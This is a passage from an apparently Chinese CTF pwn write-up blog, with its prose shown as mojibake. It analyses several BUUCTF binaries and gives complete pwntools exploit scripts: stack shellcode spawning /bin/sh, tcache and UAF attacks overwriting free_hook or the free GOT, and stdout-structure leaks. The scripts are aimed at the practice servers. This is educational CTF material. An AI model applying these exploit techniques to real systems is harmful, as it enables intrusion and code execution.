ç”¨4å­—èŠ‚ï¼Œåº”è¯¥æ²¡æœ‰10å­—èŠ‚è¿™æ ·å°‘çš„shellcodeã€‚</p><p>æ‰€ä»¥è½¬å˜ä¸€ä¸‹ï¼Œæ ˆä¸Šå¡«å……å¥½shellcodeï¼Œç„¶å<code>jmp esp address</code>ï¼Œæ¥ç€è®©å…¶æ‰§è¡Œ<code>sub esp,0x28</code>ï¼Œç„¶ååœ¨è·³è½¬espã€‚</p><pre><code>Payload = shellcode + jmp esp address + sub esp,esp + jmp esp</code></pre><p>å…¶å®åŸºæœ¬éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåé¢è·Ÿä¸Šçš„ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºè°ƒæ•´espæŒ‡é’ˆçš„shellcodeã€‚</p><h3 id="esp"><a href="#esp" class="headerlink" title="esp"></a>esp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_s_9&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26283)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()jmp_esp = 0x08048554shellcode= &#39;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&#39;shellcode = shellcode.ljust(0x24,&#39;\x00&#39;)gadgets = asm(&#39;sub esp,0x28;jmp esp&#39;)print(gadgets)payload = shellcode + p32(jmp_esp) + gadgets# debug()sl(payload)itr()</code></pre><h2 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a><code>roarctf_2019_realloc_magic</code></h2><h3 id="åˆ†æ-19"><a href="#åˆ†æ-19" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h4 id="æ¼æ´ç‚¹-4"><a href="#æ¼æ´ç‚¹-4" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><ul><li>UAF</li></ul><p>ç¨‹åºç”¨reallocå‡½æ•°æ¥åˆ†é…å †å—ï¼Œå› ä¸ºä¸ç†Ÿæ‚‰è¿™ä¸ªæçš„æˆ‘ï¼Œå¥½ä¹…æ²¡æœ‰åšå‡ºæ¥ã€‚</p><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><h4 id="reallocçš„ç‰¹ç‚¹"><a href="#reallocçš„ç‰¹ç‚¹" class="headerlink" title="reallocçš„ç‰¹ç‚¹"></a>reallocçš„ç‰¹ç‚¹</h4><p>åŸºç¡€åŠŸèƒ½æ˜¯æ”¹å˜<code>mem_address</code>æ‰€æŒ‡å†…å­˜åŒºåŸŸçš„å¤§å°ä¸ºnewsizeé•¿åº¦ã€‚è¿™é‡Œå°±æœ‰å‡ ç§ä¸åŒçš„æƒ…å†µ</p><ul><li>1.å½“sizeä¸º0ï¼Œè¿™æ—¶å°±ç›¸å½“äºfree()å‡½æ•°ï¼ŒåŒæ—¶è¿”å›å€¼ä¸ºnull</li><li>2.å½“æŒ‡é’ˆä¸º0ï¼Œsizeå¤§äº0ï¼Œç›¸å½“äºmallocå‡½æ•°</li><li>3.sizeå°äºç­‰äºåŸæ¥çš„sizeï¼Œåˆ™åœ¨åŸå…ˆçš„åŸºç¡€ä¸Šç¼©å°ï¼Œå¤šä½™çš„å †å—freeæ‰</li><li>4.sizeå¤§äºåŸæ¥çš„sizeï¼Œå¦‚æœ<strong>æœ‰è¶³å¤Ÿç©ºé—´</strong>å°±åŸåŸºç¡€æ‰©å……ï¼Œç©ºé—´ä¸è¶³åˆ™åˆ†é…æ–°çš„å†…å­˜ï¼Œå¹¶å°†åŸæ¥æŒ‡é’ˆæŒ‡å‘çš„å †å—æ—§å†…å®¹å¤åˆ¶åˆ°æ–°çš„å †å—å†…å­˜ä¸­ï¼Œç„¶åå†å°†åŸæ¥çš„å †å—freeæ‰ã€‚</li></ul><p>å…¶ä¸­ç¬¬4ç‚¹ï¼Œæœ‰è¶³å¤Ÿç©ºé—´ï¼Œç”»å›¾è§£é‡Šä¸€ä¸‹ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/uqru5B.png" srcset="/img/loading.gif" alt></p><p>ç”±äºè¿™ä¸ªç‰¹æ€§ï¼Œæ¥åˆ¶ä½œ3ä¸ªå †å—Aã€Bã€Cï¼ŒBå †å—ä½œä¸ºè¿›å…¥unsortbinçš„å †å—å­˜åœ¨ï¼ŒCæ˜¯ä¸ºäº†é˜²æ­¢ä¸è®©Cåˆå¹¶top chunkï¼Œç„¶åç”¨Aæ¥ç”³è¯·ä¸€ä¸ªsize&lt;=ï¼ˆAçš„size + Bçš„sizeï¼‰çš„å †å—ï¼Œè¿™æ ·å°±é€ æˆäº†å †å—çš„é‡å ã€‚</p><h4 id="åˆ©ç”¨-IO-2-1-stdout-æ¥æ³„æ¼ä¿¡æ¯"><a href="#åˆ©ç”¨-IO-2-1-stdout-æ¥æ³„æ¼ä¿¡æ¯" class="headerlink" title="åˆ©ç”¨ _IO_2_1_stdout_ æ¥æ³„æ¼ä¿¡æ¯"></a><code>åˆ©ç”¨ _IO_2_1_stdout_ æ¥æ³„æ¼ä¿¡æ¯</code></h4><p>å‚è€ƒé“¾æ¥ï¼š<br><a href="http://pzhxbz.cn/?p=139" target="_blank" rel="noopener">http://pzhxbz.cn/?p=139</a></p><p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><p>è¿™ä¸ªé¢˜å› ä¸ºæœ‰è¿‡è¾“å‡ºï¼Œå…¶<code>_IO_CURRENTLY_PUTTING</code>å°±æ˜¯ä¸º1çš„ ï¼Œå¯¹äº<code>_IO_IS_APPENDING</code>è¿™ä¸ªflagçš„å€¼ï¼Œå°†è¿™ä¸ªflagææˆ1ä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡ä¿®æ”¹<code>_IO_buf_base</code>æ¥å®Œæˆleakã€‚</p><p>åœ¨èµ›é¢˜ä¸­ï¼Œå¾ˆå¤šç¨‹åºéƒ½æ˜¯ç”¨è¿‡è¾“å‡ºå‡½æ•°è¿›è¡Œè¾“å‡ºçš„ï¼ŒåŸºæœ¬å°±æ˜¯æ”¹æ‰flagï¼Œä¸­é—´çš„ä¸‰ä¸ªå˜é‡åœ¨è¾“å‡ºçš„è¿‡ç¨‹ä¸­éƒ½ä¸æ€ä¹ˆç”¨å¾—åˆ°ï¼Œç›´æ¥ç›–æˆ0,ä½ä½è¦†ç›–<code>_IO_buf_base</code>ä¸ºåˆé€‚çš„å€¼å°±å¯ä»¥å®Œæˆleakã€‚</p><p>Flag æ€ä¹ˆè®¾ç½®ï¼Œåœ¨èµ›é¢˜ä¸­è¿˜æ˜¯å¾ˆéšæ„çš„ï¼š</p><pre><code>0xfbad18870xfbad3c80</code></pre><p>é‡ç‚¹å°±æ˜¯è®©<code>stdout-&gt;_IO_read_end == stdout-&gt;_IO_write_base</code></p><p>å¤§ä½“çš„åˆ©ç”¨æ–¹æ³•å°±æ˜¯åˆ©ç”¨unsorted binçš„åœ¨tcacheæˆ–fastbinçš„fdä¸Šç•™ä¸‹<code>main_arena</code>çš„åœ°å€ï¼Œç”±äº<code>_IO_2_1_stdout_</code>ä¸<code>arena</code>åªç›¸å·®4ä½ï¼Œä¸”ä½ä¸‰ä½å·²çŸ¥ï¼Œåœ¨ä¼ å…¥æ˜¯ä½3ä½è¦†ç›–fdç•™ä¸‹çš„<code>main_arena</code>çš„åœ°å€ï¼Œå‰©ä½™ä¸€ä½å¯ä»¥çˆ†ç ´ï¼Œæ¦‚ç‡1/16,ä»è€ŒåŠ«æŒstdoutä»¥è¾¾åˆ°æ³„éœ²çš„ç›®çš„ ã€‚</p><h2 id="exp-21"><a href="#exp-21" class="headerlink" title="exp"></a>exp</h2><pre><code class="python">from pwn import *import timelocal_file  = &#39;./roarctf_2019_realloc_magic&#39;elf = ELF(local_file)# context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,28690)    libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce18 = [0x4f2c5,0x4f322,0x10a38c]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)    sla(&#39;?&#39;,str(size))    if int(size) != 0 :        sa(&#39;?&#39;,str(data))def free():    sla(&#39;&gt;&gt;&#39;,&#39;2&#39;)def leak_addr():    add(0x80,&#39;aaaaaaa&#39;)    add(0,&#39;&#39;)    add(0x100,&#39;aaaaaaaa&#39;)    add(0,&#39; &#39;)    add(0x110,&#39; &#39;)    add(0,&#39;&#39;)    add(0x100,&#39;a&#39;)    for i in range(7):        free()    add(0,&#39;1&#39;)    add(0x80,&#39;\x60\x87&#39;)    payload = 17 * p64(0) + p64(0x61) + &#39;\x60\x87&#39;    add(0x190,payload)    add(0,&#39;&#39;)    add(0x100,&#39;\x60\x87&#39;)    add(0,&#39;&#39;)    payload = p64(0xfbad3c80) + &#39;\x00&#39; * 8 * 3 + &#39;\x00&#39;    add(0x100,payload)leak = 0while True:    try:        leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&#39;&#39;)        io.recv(16)        leak = u64(io.recv(8))        if leak == 0x320a6464412e310a:            raise Exception(&#39;&#39;)        break    except Exception:        io.close()        # io = process(&#39;./roarctf_2019_realloc_magic&#39;)        io = remote(&#39;node3.buuoj.cn&#39;,28690)        continueleak = leak &gt;&gt; 16info_addr(&#39;leak&#39;,leak)libc_base = leak - 4110208info_addr(&#39;libc_base&#39;,libc_base)free_hook = 4118760 + libc_basesys_addr = 324832+libc_basesla(&#39;&gt;&gt;&#39;,&#39;666&#39;)add(0x120,&#39;aaaaaaa&#39;)add(0,&#39;&#39;)add(0x130,&#39;aaaaaaaa&#39;)add(0,&#39; &#39;)add(0x160,&#39; &#39;)add(0,&#39;&#39;)add(0x130,&#39;a&#39;)for i in range(7):    free()add(0,&#39;1&#39;)add(0x120,&#39;\x60\x87&#39;)payload = 37 * p64(0) + p64(0x71) + p64(free_hook)add(0x260,payload)add(0,&#39;&#39;)add(0x130,&#39;a&#39;)add(0,&#39;&#39;)one_rec = rce18[1] +libc_baseadd(0x130,p64(one_rec))free()# debug()itr()</code></pre><p>å…¶ä¸­expçš„çˆ†ç ´stdoutéƒ¨åˆ†ï¼Œå¯ä»¥å½“ä½œæ¨¡ç‰ˆä½¿ç”¨ï¼Œæ¥è‡ªpzhxbzå¤§ä½¬çš„ã€‚</p><h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a><code>ciscn_2019_en_3</code></h2><h3 id="åˆ†æ-20"><a href="#åˆ†æ-20" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å¸¸è§„å †é¢˜ï¼ŒUAFï¼Œdupæ‰“<code>free_hook_</code>ã€‚ä¸Šæ¥ç”¨<code>puts(&amp;s)</code>ï¼Œæ¥æ³„æ¼æ ˆä¸Šå­˜åœ¨çš„libcåœ°å€ã€‚</p><h3 id="exp-22"><a href="#exp-22" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_2019_en_3&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,29542)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;ice&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&#39;story&#39;,str(data))def free(idx):    sla(&#39;ice&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))payload = &#39;a&#39; * (0x20-8)sa(&#39;name&#39;,payload)sa(&#39;ID&#39;,&#39;chumen77&#39;)ru(&#39;chumen77&#39;)libc_base = uu64(r(6)) - 0x81237info_addr(&#39;libc_base&#39;,libc_base)add(0x50,&#39;aaaaaaaa&#39;)free(0)free(0)free_hook = libc_base + 0x3ed8e8add(0x50,p64(free_hook))add(0x50,p64(free_hook))rec = rce18[1] + libc_baseadd(0x50,p64(rec))free(0)itr()</code></pre><h2 id="æå®¢å¤§æŒ‘æˆ˜2019-Not-bad"><a href="#æå®¢å¤§æŒ‘æˆ˜2019-Not-bad" class="headerlink" title="æå®¢å¤§æŒ‘æˆ˜2019 Not bad"></a>æå®¢å¤§æŒ‘æˆ˜2019 Not bad</h2><h3 id="åˆ†æ-21"><a href="#åˆ†æ-21" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æº¢å‡º0x18ä¸ªå­—èŠ‚ï¼ŒåŠ ä¸Šæœ¬èº«çš„æ ˆé•¿åº¦ï¼Œè¯»orw çš„shellcodeå†…å­˜ä¸æ˜¯å¾ˆå¤Ÿç”¨ã€‚éœ€è¦è¿ç§»åˆ°mmapï¼Œè¿›è¡Œorwã€‚æ‰€ä»¥æ‘†åœ¨æ ˆä¸Šçš„shellcodeå°±æ˜¯ï¼Œæ¥ä¸€ä¸ªreadå‡½æ•°ï¼ŒæŠŠorwæ”¾åœ¨mmapä¸Šï¼Œç„¶åå†è·³è½¬ä¸Šå»æ‰§è¡Œå³å¯ã€‚å¹¶ä¸”å†æ¬¡ç”¨åˆ° <code>jmp rsp</code> + shellcode.</p><h3 id="exp-23"><a href="#exp-23" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./bad&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,29794)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()mmap = 0x123000jmp_rsp = 0x0000000000400a01# bss = 0x6010B0 - 0x20orw = asm(shellcraft.open(&quot;./flag&quot;))orw += asm(shellcraft.read(3,&quot;rsp&quot;,0x30))orw += asm(shellcraft.write(1,&quot;rsp&quot;,0x30))payload = asm(shellcraft.read(0,mmap + 0x300,0x100)) + asm(&#39;mov rax,0x123300;call rax&#39;)payload = payload.ljust(0x28,&#39;a&#39;)payload += p64(jmp_rsp) +   asm(&#39;sub rsp,0x30;jmp rsp&#39;)sa(&#39;fun&#39;,payload)s(orw)itr()</code></pre><h2 id="ciscn-2019-final-5"><a href="#ciscn-2019-final-5" class="headerlink" title="ciscn_2019_final_5"></a><code>ciscn_2019_final_5</code></h2><h3 id="åˆ†æ-22"><a href="#åˆ†æ-22" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>ä¿æŠ¤å¼€çš„ä¸å¤šï¼Œåˆ†æå’Œåˆ©ç”¨èµ·æ¥ç®€å•ä¸å°‘ã€‚</p><p>è¿™ä¸ªé¢˜éš¾ç‚¹å°±æ˜¯åœ¨äºå‘ç°æ¼æ´ç‚¹ã€‚</p><h4 id="addå‡½æ•°"><a href="#addå‡½æ•°" class="headerlink" title="addå‡½æ•°"></a>addå‡½æ•°</h4><pre><code class="c"> __int64 result; // rax  signed int i; // [rsp+4h] [rbp-1Ch]  int size; // [rsp+8h] [rbp-18h]  int idx; // [rsp+Ch] [rbp-14h]  void *buf; // [rsp+10h] [rbp-10h]  __int64 v5; // [rsp+18h] [rbp-8h] printf(&quot;index: &quot;);  idx = read_int();  if ( idx &lt; 0 || idx &gt; 16 )  {    puts(&quot;index is invalid.&quot;);    exit(-1);  }  printf(&quot;size: &quot;);  size = read_int();  if ( size &lt; 0 || size &gt; 0x1000 )  {    puts(&quot;size is invalid.&quot;);    exit(-1);  }  buf = malloc(size);  if ( !buf )  {    puts(&quot;malloc error.&quot;);    exit(-1);  }  printf(&quot;content: &quot;);  read(0, buf, size);  show_diy((__int16)buf);</code></pre><p>å¯ä»¥è‡ªå®šä¹‰è¾“å…¥å †çš„ç¼–å·ï¼Œæœ€å¤§å¯ä»¥17ä¸ªï¼Œå°±æ„Ÿè§‰æœ‰ç‚¹å¥‡æ€ªã€‚ç„¶åä»¥æ ˆä¸Šçš„ä¸€ä¸ªbufæ¥å­˜å–åˆ†é…heapçš„åœ°å€ã€‚</p><pre><code class="c">result = sub_400AB0((__int64)buf, idx);  v5 = result;  for ( i = 0; i &lt;= 16; ++i )  {    result = heaplist_idx[i];    if ( !result )    {      heaplist_idx[i] = v5;      result = i;      sizelist[i] = size;      break;    }  }</code></pre><pre><code class="c">__int64 __fastcall sub_400AB0(__int64 a1, int a2){  return a1 | a2;}</code></pre><p>å¯ä»¥çœ‹åˆ°ä»¥å †åœ°å€ä¸å †çš„idè¿›è¡Œä»¥æ¥ä¸€ä¸ª<code>|</code> è¿ç®—ã€‚ç„¶åè¿”å›å›æ¥ç»™v5ï¼Œç„¶ååœ¨å­˜å…¥bssçš„ä¸€æ®µåœ°å€ä¸­ã€‚ç®—æ˜¯å¤„ç†è¿‡çš„å †åœ°å€ã€‚</p><p>å°è¯•ç ”ç©¶ä¸€ä¸‹ï¼Œåšå®Œå¤„ç†æ˜¯ä»€ä¹ˆæ ·å­ï¼š</p><p>å…ˆåˆ†é…ä¸€ä¸ªå †å·ä¸º1 å’Œ 16çš„å †å—ï¼Œçœ‹ä¸‹bssé‡Œé¢æ˜¯å­˜å…¥äº†ä»€ä¹ˆã€‚</p><pre><code>x/30gx  0x6020E00x6020e0:       0x0000000000e35270(16)      0x0000000000e35281(0)</code></pre><pre><code>In [2]: hex(0x0e35260 | 16)Out[2]: &#39;0xe35270&#39;In [3]: hex(0x00e35281 | 0)Out[3]: &#39;0xe35281&#39;</code></pre><p>å·®ä¸å¤šå°±æ˜¯è¿™æ ·ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥å‘ç°ç‚¹å¼‚æ ·ã€‚å› ä¸ºæ˜¯<code>|</code> çš„é€»è¾‘è¿ç®—ï¼Œåœ¨<code>0-0xf</code>æ˜¯ä¸€ä¸ªè½®å›åï¼Œåˆ°äº†16å°±åˆç®—æ˜¯ä¸€ä¸ªè½®å›ã€‚<br>æ—¢ç„¶å¤„ç†è¿‡å †åœ°å€ï¼Œé‚£è‚¯å®šå–å‡ºæ¥è¿›è¡Œæ“ä½œæ—¶ï¼Œè‚¯å®šè¿˜ä¼šå†è¿›è¡Œå¤„ç†å›æ¥ã€‚ä¸‹é¢å°±æ˜¯æ³¨æ„æ€ä¹ˆå¤„ç†çš„ã€‚</p><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><pre><code class="c"> for ( i = 0; i &lt;= 16; ++i )  {    result = get_idx(heaplist_idx[i]);    if ( result == idx )    {      printf(&quot;content: &quot;);      read_diy((void *)(heaplist_idx[i] &amp; 0xFFFFFFFFFFFFFFF0LL), sizelist[i]);      result = puts(&quot;edit success.\n&quot;);      break;    }  }</code></pre><pre><code class="c">__int64 __fastcall get_idx(char a1){  return a1 &amp; 0xF;}</code></pre><p>å¯ä»¥çœ‹åˆ°å…¶æ˜¯ä¾æ¬¡0-17ç¼–å·å¯¹å †å—è¿›è¡Œéå†å–å‡ºï¼Œå†å–å‡ºæ—¶ä¼šå¯¹å…¶è¿›è¡Œ<code>&amp; 0xf</code>çš„æ“ä½œæ¥å°è¯•è·å–å †å—çš„ç¼–å·ã€‚</p><p>æ¥æµ‹è¯•ä¸€ä¸‹ï¼š</p><pre><code class="c">In [5]: hex(0x00e35281 &amp; 0xf). #1å·å †å—çš„è®¡ç®—Out[5]: &#39;0x1&#39;In [6]: hex(0x00e35270 &amp; 0xf) #16å·å †å—çš„è®¡ç®—Out[6]: &#39;0x0&#39;</code></pre><p>è¿™å°±å¾ˆæ˜æ˜¾æœ‰å¼‚æ ·äº†ï¼Œç”³è¯·çš„æ˜¯16å·å †å—å…¶è®¤ä¸ºæ˜¯0å·å †å—ã€‚æ‰€ä»¥ç”³è¯·16å·çš„å †å—ï¼Œå…¶å¯ä»¥ç”¨editï¼ˆ0ï¼‰æ¥è¿›è¡Œç¼–è¾‘16å·å †å—ã€‚</p><p>ç„¶åçœ‹å…¶å¦‚ä½•ç¼–è¾‘çš„ï¼š</p><pre><code class="c">  read_diy((void *)(heaplist_idx[i] &amp; 0xFFFFFFFFFFFFFFF0LL), sizelist[i]);</code></pre><p>å…¶æ˜¯æ ¹æ®bssä¸Šå­˜çš„å¤„ç†è¿‡å †å—åœ°å€è¿›è¡Œä¸€ä¸‹<code>&amp; 0xFFFFFFFFFFFFFFF0</code> æ¥è¿›è¡Œç¼–è¾‘çš„ã€‚<br>å¯¹äºä¸Šæ¥å°±ç”³è¯·äº†ä¸€ä¸ª16å·çš„å †å—ï¼Œå¾ˆå®¹æ˜“çŸ¥é“å…¶å †å—çš„æœ«3ä¸ºåº”è¯¥æ˜¯0x260ï¼Œä½†æ˜¯å½“æ—¶å­˜å…¥çš„æ˜¯0x270ï¼Œå°è¯•è¿›è¡Œä¸€ä¸‹<code>&amp; 0xFFFFFFFFFFFFFFF0</code>ï¼š</p><pre><code>In [7]: hex(0x00e35270 &amp; 0xFFFFFFFFFFFFFFF0)Out[7]: &#39;0xe35270&#39;</code></pre><p>å‘ç°å¹¶ä¸æ˜¯ä»0x260è¿›è¡Œç¼–è¾‘ï¼Œä½†æ˜¯åŒæ ·è¿˜æ˜¯å¯ä»¥ç¼–è¾‘åŒæ ·çš„sizeï¼Œæ‰€ä»¥è¿™å°±é€ æˆäº†æº¢å‡ºï¼Œå¹¶ä¸”æ˜¯0x10ä¸ªå­—èŠ‚ã€‚</p><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul><li>é‡Šæ”¾2ä¸ªtcache å †å—ï¼Œå¹¶ä¸”åˆ©ç”¨0x10å­—èŠ‚ï¼Œæ”¹å…¶ä¸­ä¸€ä¸ªå †å—çš„fdï¼Œæ”¹ä¸ºfreeçš„gotä½ç½®</li><li>ç”³è¯·å †å—åˆ°free gotå¤„ï¼Œæ”¹free ä¸º puts</li><li>æ„é€ å‡ºä¸€ä¸ªunsortbinçš„å †å—ï¼Œç„¶åå†ç”³è¯·ä¸€ä¸ªå †å—ï¼Œå°±ä¼šåœ¨è¿™ä¸ªå †å—ä¸Šç•™ä¸‹éƒ¨åˆ†çš„libcåœ°å€ï¼Œç„¶åè¿›è¡Œleak</li><li>ç®—å‡ºsystemçš„åœ°å€ï¼Œç»§ç»­æ”¹free got å¤„ä¸º systemï¼Œç„¶åfreeä¸€ä¸ªå¸¦æœ‰<code>/bin/sh\x00</code>çš„å †å—ï¼Œå³å¯æ‹¿åˆ°shell</li></ul><h3 id="exp-24"><a href="#exp-24" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *import timelocal_file  = &#39;./ciscn_final_5&#39;elf = ELF(local_file)# context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27180)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&#39;choice:&#39;,&#39;1&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sa(&#39;content&#39;,str(data))def free(idx):    sla(&#39;choice:&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def edit(idx,data):    sla(&#39;choice:&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))    sa(&#39;content&#39;,str(data))add(16,0x18,&#39;sasdasdas&#39;)add(1,0x30,&#39;aaaaaaaa&#39;)add(2,0x30,&#39;aaaaaaaa&#39;)free(2)free(1)edit(0,p64(0) + p64(0x121) + p64(0x000000000602010))add(5,0x800,&#39;aaaaaaaa&#39;)add(6,0x50,&#39;aaaa&#39;)add(3,0x30,&#39; &#39;)free(5)add(7,0x90,&#39; &#39;)add(4,0x30,&#39;aaaaaaaa&#39; + p64(elf.plt[&#39;puts&#39;]))free(7)r()libc_base = uu64(r(6)) - 0x3ec120info_addr(&#39;libc_base&#39;,libc_base)edit(4,&#39;aaaaaaaa&#39; + p64(libc.sym[&#39;system&#39;] + libc_base))add(9,0x10,&#39;/bin/sh\x00&#39;)free(9)itr()</code></pre><p>ç”±äºå…¶ç¡®å®šå †å—çš„ç‰¹æ®Šæ€§ï¼Œåœ¨ç”³è¯·å †å—åˆ°free gotæ—¶ï¼Œå› ä¸ºå…¶åœ¨<code>0x000000000602018</code>ï¼Œä½†æ˜¯åœ¨ç»è¿‡é€»è¾‘è¿ç®—å¤„ç†åï¼Œæ”¾å…¥bssåï¼Œæƒ³è¦å†è¿›è¡Œæ“ä½œå°±æœ‰ç‚¹å›°éš¾ï¼Œæ‰€ä»¥ç”³è¯·åˆ°<code>0x000000000602010</code> å°±OKäº†ã€‚</p><h2 id="ciscn-2019-s-1"><a href="#ciscn-2019-s-1" class="headerlink" title="ciscn_2019_s_1"></a><code>ciscn_2019_s_1</code></h2><h3 id="åˆ†æ-23"><a href="#åˆ†æ-23" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¿æŠ¤ï¼š</p><pre><code>[*] &#39;/ctf/work/buuctf/shuati/ciscn_2019_s_1/ciscn_s_1&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>Addå‡½æ•°ï¼šæœ€å¤šå¯ä»¥ç”³è¯·33ä¸ªå †ï¼Œä¸”é—®ä½ å 